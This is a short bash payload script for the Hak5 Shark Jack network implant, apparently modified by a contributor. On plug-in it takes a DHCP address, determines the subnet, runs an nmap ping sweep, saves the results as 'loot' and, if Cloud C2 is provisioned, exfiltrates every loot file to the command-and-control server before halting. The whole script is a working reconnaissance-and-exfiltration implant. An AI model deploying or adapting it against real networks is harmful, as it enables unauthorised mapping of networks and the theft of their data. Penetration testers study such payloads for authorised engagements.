#!/bin/bash
#
# Title:         Nmap Payload for Shark Jack w/ C2
# Author:        Hak5 (modifications from REDD)
# Version:       1.1
#
# All credit goes to Hak5 Team. I just through in a simple check for if
# C2 is provisioned in the SharkJack. - If so, exfiltrate! 
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder. Exfiltrates all scans to C2 if provisioned.
#
# LED SETUP ... Obtaining IP address from DHCP
# LED ATTACK ... Scanning
# LED FINISH ... Scan Complete
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

C2PROVISION="/etc/device.config"
NMAP_OPTIONS="-sP --host-timeout 30s --max-retries 3"
LOOT_DIR=/root/loot/nmap

# Setup loot directory, DHCP client, and determine subnet
LED SETUP                            
mkdir -p $LOOT_DIR                           
COUNT=$(($(ls -l $LOOT_DIR/*.txt | wc -l)+1))
NETMODE DHCP_CLIENT                          
while [ -z "$SUBNET" ]; do  
  sleep 1 && SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
done                                                                                                                                                    
                                                                                                                                                        
# Scan network                                                                                                                                          
LED ATTACK    
nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$COUNT.txt

# Exfiltrate Loot to Cloud C2
if [[ -f "$C2PROVISION" ]]; then
  LED SPECIAL
  # Connect to Cloud C2
  C2CONNECT
  # Wait until Cloud C2 connection is established
  while ! pgrep cc-client; do sleep 1; done
  # Exfiltrate all test loot files
  FILES="$LOOT_DIR/*.txt"
  for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Payload; done
else
  # Exit script if not provisioned for C2
  LED R SOLID
  exit 1
fi

LED FINISH                                                                          
sleep 2 && halt
